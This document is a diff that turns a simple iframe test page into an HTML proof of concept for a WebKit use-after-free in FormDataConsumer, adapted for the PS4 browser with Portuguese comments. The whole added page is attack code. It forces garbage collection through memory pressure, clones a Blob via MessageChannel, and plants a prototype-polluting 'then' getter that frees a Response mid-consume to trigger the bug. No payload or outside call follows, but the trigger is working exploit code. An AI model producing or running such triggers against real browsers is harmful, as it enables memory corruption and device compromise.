@@ -1,39 +1,100 @@
-
 <!DOCTYPE html>
 <html>
+<head>
+    <title>FormDataConsumer UAF - PS4 PoC</title>
+</head>
 <body>
+<pre id="log"></pre>
 <script>
-const iterations = 25;
-let n = 0;
-
-function runTest(win) {
-    const xhr = new win.XMLHttpRequest();
-    xhr.open("GET", "data:text/plain,TEST");
-    xhr.onload = function() {};
-    xhr.onerror = function() {};
-    xhr.send();
+function log(msg) {
+    document.getElementById('log').textContent += msg + '\n';
+    console.log(msg);
 }
 
-function round() {
-    const frame = document.createElement("iframe");
-    document.body.appendChild(frame);
-
-    try {
-        runTest(frame.contentWindow);
-    } catch(e) {
-        console.log("ERROR:", e.message);
+// --- Substituição do gc.js do WebKit test harness ---
+// No PS4 release browser gc() não existe diretamente.
+// Pressão de memória para encorajar o GC a rodar.
+function gc() {
+    function gcRec(n) {
+          if (n < 1)
+              return {};
+          var temp = {i: "ab" + i + (i / 100000)};
+          temp += "foo";
+          gcRec(n-1);
     }
-
-    frame.remove();
-
-    if (++n < iterations) {
-        setTimeout(round, 0);
-    } else {
-        document.body.innerHTML += "<p>TEST FINISHED</p>";
-    }
+    for (var i = 0; i < 10000; i++)
+    gcRec(10);
 }
 
-onload = round;
+function sleep(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+// --- Substituição do IndexedDB por MessageChannel ---
+// MessageChannel.postMessage() usa o mesmo Structured Clone Algorithm
+// que o IndexedDB usa internamente. O resultado é equivalente:
+// um Blob com nova identidade JS mas apontando para os mesmos dados.
+function createClonedBlob() {
+    return new Promise((resolve, reject) => {
+        const channel = new MessageChannel();
+
+        channel.port1.onmessage = function(e) {
+            // Mesmo ponto do PoC original: GC após receber o clone
+            gc();
+            resolve(e.data);
+        };
+
+        channel.port1.onmessageerror = function() {
+            reject(new Error('MessageChannel clone failed'));
+        };
+
+        // Envia o Blob — o structured clone acontece aqui
+        channel.port2.postMessage(new Blob(['aa']));
+    });
+}
+
+// --- Trigger principal do UAF ---
+async function triggerUAF() {
+    log('[*] Criando Blob clonado via MessageChannel...');
+    const blob = await createClonedBlob();
+    log('[*] Blob clonado recebido: ' + blob.size + ' bytes');
+
+    // Pequena pausa — igual ao sleep(100) do original
+    await sleep(100);
+
+    const formData = new FormData();
+    formData.append('a', blob);
+    log('[*] FormData construído com o blob');
+
+    let response = new Response(formData);
+    log('[*] Response criado, armando prototype getter...');
+
+    // Prototype pollution: quando qualquer Promise tentar checar .then
+    // em um valor retornado (torna-o "thenable"), este getter dispara.
+    // Isso acontece DENTRO do fluxo assíncrono de FormDataConsumer::consume,
+    // no momento certo para nular a Response e pressionar o GC.
+    Object.prototype.__defineGetter__('then', function() {
+        log('[!] Getter .then disparado — nullando response e chamando gc()');
+        response = null;
+        gc();
+        // Retorna undefined para não parecer um thenable real
+    });
+
+    log('[*] Chamando response.arrayBuffer() — iniciando consume...');
+    response.arrayBuffer();
+
+    // Dá tempo para o crash ou completar
+    await sleep(1000);
+
+    // Limpeza do prototype (se chegou até aqui)
+    try { delete Object.prototype.then; } catch(e) {}
+    log('[*] Concluído sem crash aparente (bug pode estar patchado ou timing errado)');
+}
+
+triggerUAF().catch(function(e) {
+    try { delete Object.prototype.then; } catch(_) {}
+    log('[!] Erro: ' + e.message);
+});
 </script>
 </body>
 </html>
